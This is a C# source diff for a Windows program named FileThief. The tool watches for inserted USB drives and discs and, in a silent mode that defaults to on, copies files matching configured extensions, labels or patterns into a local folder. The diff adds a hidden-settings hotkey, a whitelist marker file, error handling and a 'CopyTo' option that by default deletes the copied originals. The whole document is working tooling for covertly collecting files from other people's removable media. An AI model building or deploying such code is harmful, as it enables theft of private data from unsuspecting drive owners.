@@ -4,23 +4,38 @@ using System.Globalization;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading;
 using System.Windows.Forms;
 
 namespace FileThief
 {
     public partial class FrmMain : Form
     {
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool RegisterHotKey(
+            IntPtr hWnd,                //要定义热键的窗口的句柄
+            int id,                     //定义热键ID（不能与其它ID重复）           
+            uint fsModifiers,   //标识热键是否在按Alt、Ctrl、Shift、Windows等键时才会生效
+            uint vk                     //定义热键的内容
+        );
+
+        [DllImport("user32.dll", SetLastError = true)]
+        public static extern bool UnregisterHotKey(
+            IntPtr hWnd,                //要取消热键的窗口的句柄
+            int id                      //要取消热键的ID
+        );
+
         public const int WmDevicechange = 0x219;
         public const int DbtDevicearrival = 0x8000;
         public const int DbtDeviceremovecomplete = 0x8004;
+        public const int WmHotkey = 0x0312; //786
 
         public static string UsbDrive, UsbLabel;
 
         public static bool IsAllFiles;
-
+        public static Form FrmSettings = new FrmSettings();
         public FrmMain()
         {
             InitializeComponent();
@@ -28,6 +43,7 @@ namespace FileThief
 
         protected override void WndProc(ref Message m)
         {
+            System.Diagnostics.Debug.WriteLine(m.Msg.ToString());
             if (m.Msg == WmDevicechange)
             {
                 switch (m.WParam.ToInt32())
@@ -44,6 +60,12 @@ namespace FileThief
                         break;
                 }
             }
+            else if (m.Msg == WmHotkey)
+            {
+                Keys key = (Keys)(((int)m.LParam >> 16) & 0xFFFF);
+                if (!FrmSettings.Visible) FrmSettings.ShowDialog();
+            }
+            
             base.WndProc(ref m);
         }
 
@@ -63,7 +85,7 @@ namespace FileThief
                 ClsMain.WriteIni("Driver", "VolumeLabelMode", "0", ClsMain.StrConfig);
 
                 ClsMain.WriteIni("Log", "WriteLog", "1", ClsMain.StrConfig);
-                ClsMain.WriteIni("Log", "LogPath", Application.StartupPath + "\\FileThief.log", ClsMain.StrConfig);
+                ClsMain.WriteIni("Log", "LogPath", "", ClsMain.StrConfig);
                 ClsMain.WriteIni("Log", "LogError", "1", ClsMain.StrConfig);
                 ClsMain.WriteIni("Log", "LogInfo", "1", ClsMain.StrConfig);
 
@@ -73,6 +95,15 @@ namespace FileThief
                 ClsMain.WriteIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
                 ClsMain.WriteIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
                 ClsMain.WriteIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+
+                ClsMain.WriteIni("Device", "Whitelist", "1", ClsMain.StrConfig);
+
+                ClsMain.WriteIni("Hotkey", "Enabled", "0", ClsMain.StrConfig);
+                ClsMain.WriteIni("Hotkey", "Hotkey", "", ClsMain.StrConfig);
+
+                ClsMain.WriteIni("CopyTo", "Enabled", "0", ClsMain.StrConfig);
+                ClsMain.WriteIni("CopyTo", "SavePath", "", ClsMain.StrConfig);
+                ClsMain.WriteIni("CopyTo","DeleteOriginalFiles","1",ClsMain.StrConfig);
                 LoadSettings();
                 if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                 if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
@@ -130,9 +161,31 @@ namespace FileThief
             ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
             ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);
 
-            ClsMain.ConUSBDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
-            ClsMain.ConUSBHD = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
-            ClsMain.ConROM = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+            ClsMain.ConUsbDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
+            ClsMain.ConUsbhd = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
+            ClsMain.ConRom = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+
+            ClsMain.ConWhitelist = ClsMain.ReadIni("Device", "Whitelist", "1", ClsMain.StrConfig);
+
+            ClsMain.ConHotkeyE = ClsMain.ReadIni("Hotkey", "Enabled", "0", ClsMain.StrConfig);
+            ClsMain.ConHotkey = ClsMain.ReadIni("Hotkey", "Hotkey", "", ClsMain.StrConfig);
+
+            ClsMain.ConCopyTo = ClsMain.ReadIni("CopyTo", "Enabled", "0", ClsMain.StrConfig);
+            ClsMain.ConCtDevice = ClsMain.ReadIni("CopyTo", "SaveDevice", "", ClsMain.StrConfig);
+            ClsMain.ConDelOri = ClsMain.ReadIni("CopyTo", "DeleteOriginalFiles", "1", ClsMain.StrConfig);
+
+            System.Diagnostics.Debug.WriteLine("CHE "+ClsMain.ConHotkeyE);
+            bool t = RegHotKey(ClsMain.ConHotkey, Handle);
+            System.Diagnostics.Debug.WriteLine("t "+ t);
+            if (ClsMain.ConHotkeyE == "1")
+            {
+                if (t == false)
+                    MessageBox.Show("热键注册失败。", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            else
+            {
+                System.Diagnostics.Debug.WriteLine("成功！");
+            }
         }
 
         public static void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
@@ -140,6 +193,11 @@ namespace FileThief
             if (driver != "")
             {
                 var mDirInfo = new DirectoryInfo(driver);
+                if (File.Exists(UsbDrive + ".ftwl") && ClsMain.ConWhitelist == "1")
+                {
+                    WriteLog("检测到 " + UsbDrive + " 存在白名单, 跳过",0,ClsMain.ConLogPath);
+                    return;
+                }
                 try
                 {
                     //Specified Volume Label
@@ -159,7 +217,6 @@ namespace FileThief
                         // Not specified Volume Label
                         // Check whether copy all files or not
                         CheckIfAllFiles(extension, driver, mDirInfo, volumeLabel);
-
                     }
                 }
                 catch (Exception ex)
@@ -171,7 +228,7 @@ namespace FileThief
 
         private void tsmiSettings_Click(object sender, EventArgs e)
         {
-            new FrmSettings().Show();
+            if (!FrmSettings.Visible) FrmSettings.ShowDialog();
         }
 
         private void tsmiStartStop_Click(object sender, EventArgs e)
@@ -196,18 +253,25 @@ namespace FileThief
 
         public static void WriteLog(string content, int logType, string path)
         {
-            var dt = DateTime.Now;
-            using (var file = new StreamWriter(path, true))
+            try
             {
-                switch (logType)
+                var dt = DateTime.Now;
+                using (var file = new StreamWriter(path, true))
                 {
-                    case 0: // Info
-                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
-                        break;
-                    case 1: // Error
-                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
-                        break;
-                } 
+                    switch (logType)
+                    {
+                        case 0: // Info
+                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
+                            break;
+                        case 1: // Error
+                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
+                            break;
+                    }
+                }
+            }
+            catch(Exception)
+            {
+                    
             }
         }
 
@@ -225,39 +289,40 @@ namespace FileThief
                 switch (d.DriveType)
                 {
                     case DriveType.Removable: // Removable Drivers (except USB Hard Disk)
-                        if (d.IsReady && ClsMain.ConUSBDisk=="1" && ClsMain.Status )
-                            {
+                        if (d.IsReady && ClsMain.ConUsbDisk=="1" && ClsMain.Status)
+                        {
                             UsbDrive = d.Name;
                             // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                             UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                             if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel +", USB 闪存盘", 0, ClsMain.ConLogPath);
-                            var tScanFile = new Thread(StartThread);
-                            tScanFile.Start();
+                            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
+                            /* Remove multi-thread method
+                             * 
+                             * var tScanFile = new Thread(StartThread);
+                             * tScanFile.Start(); */
                         }
                         break;
                     case DriveType.Fixed:
                         if (isUsb) // USB Hard Disk
                         {
-                            if (d.IsReady && ClsMain.ConUSBHD == "1" && ClsMain.Status)
+                            if (d.IsReady && ClsMain.ConUsbhd == "1" && ClsMain.Status)
                             {
                                 UsbDrive = d.Name;
                                 // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                                 UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                                 if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入, 盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", USB 硬盘", 0, ClsMain.ConLogPath);
-                                var tScanFile = new Thread(StartThread);
-                                tScanFile.Start();
+                                ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
                             }
                         }
                         break;
                     case DriveType.CDRom: // CD/DVD ROM
-                        if (d.IsReady && ClsMain.ConROM == "1" && ClsMain.Status)
+                        if (d.IsReady && ClsMain.ConRom == "1" && ClsMain.Status)
                         {
                             UsbDrive = d.Name;
                             // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
                             UsbLabel = d.VolumeLabel != "" ? d.VolumeLabel : d.Name.Replace(":\\", "") + " (" + d.GetHashCode() + ")";
                             if (ClsMain.ConLogInfo == "1") WriteLog("新设备接入，盘符 " + UsbDrive + ", 卷标 " + UsbLabel + ", 光盘", 0, ClsMain.ConLogPath);
-                            var tScanFile = new Thread(StartThread);
-                            tScanFile.Start();
+                            ScanFile(UsbDrive, ClsMain.ConLabel, ClsMain.ConType, ClsMain.ConFileNameRegExp);
                         }
                         break;
                 }
@@ -314,17 +379,25 @@ namespace FileThief
             CheckAllDriveType(usbDriveNames);
         }
 
-        public static void CopyFile(string oriFile,string saveDirectory)
+        public static void CopyFile(string oriFile,string desPath)
         {
-            // Create Directory if Not Exists
-            if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
-                Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-            if (!Directory.Exists(saveDirectory)) Directory.CreateDirectory(saveDirectory);
-            // Copy File
-            File.Copy(oriFile, oriFile.Replace(UsbDrive.Replace("\\", ""),
-                ClsMain.ConPath + "\\" + UsbLabel), true);
-            if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
-                WriteLog("已复制 " + oriFile, 0, ClsMain.ConLogPath);
+            try
+            {
+                // Create Directory if Not Exists
+                if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
+                    Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
+                if (!Directory.Exists(Path.GetDirectoryName(desPath)))
+                    Directory.CreateDirectory(Path.GetDirectoryName(desPath));
+                // Copy File
+                File.Copy(oriFile, desPath, true);
+                if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
+                    WriteLog("已复制 " + oriFile, 0, ClsMain.ConLogPath);
+            }
+            catch (Exception ex)
+            {
+                WriteLog(ex.Message,1,ClsMain.ConLogPath);
+            }
+            
         }
 
         public static void CheckRegExp(string fullName)
@@ -423,6 +496,65 @@ namespace FileThief
                     ScanFile(mDir.FullName, volumeLabel, extension, ClsMain.ConFileNameRegExp);
                 }
             }
+        }
+
+        public static bool RegHotKey(string ComboKey, IntPtr hWnd)
+        {
+            const int MOD_ALT = 0x0001;
+            const int MOD_CONTROL = 0x0002;
+            const int MOD_SHIFT = 0x004;
+            if (!ComboKey.Contains("+"))
+                return false;
+
+            string[] parts = ComboKey.Split('+');
+            int id = 23333433;
+            uint modKeys = 0;
+            uint key;
+ 
+            // Get modifiers keys from text
+            bool ctrl = ComboKey.ToLower().Contains("ctrl");
+            bool shift = ComboKey.ToLower().Contains("shift");
+            bool alt = ComboKey.ToLower().Contains("alt");
+            System.Diagnostics.Debug.WriteLine(ctrl + " " + shift + " " + alt);
+
+            if (ctrl && alt) modKeys = MOD_CONTROL | MOD_ALT;
+            else if (ctrl && shift) modKeys = MOD_CONTROL | MOD_SHIFT;
+            else if (shift && alt) modKeys = MOD_SHIFT | MOD_ALT;
+            else if (ctrl) modKeys = MOD_CONTROL;
+            else if (alt) modKeys = MOD_ALT;
+            else if (shift) modKeys = MOD_SHIFT;
+
+            bool flag=false;
+            // Get key from text
+            if (parts.Length==2 && parts[1].Trim().Length > 0)
+            {
+                char c = parts[1].Trim()[0];
+                key = c;
+                try
+                {
+                    // Register keys
+                    flag = RegisterHotKey(hWnd, id, modKeys, key);
+                }
+                catch (Exception)
+                {
+                    return false;
+                }
+            }
+            else if (parts.Length == 3)
+            {
+                char c = parts[2].Trim()[0];
+                key = c;
+                try
+                {
+                    // Register keys
+                    flag = RegisterHotKey(hWnd, id, modKeys, key);
+                }
+                catch (Exception)
+                {
+                    return false;
+                }
+            }
+            return flag;
         }
     }
 }
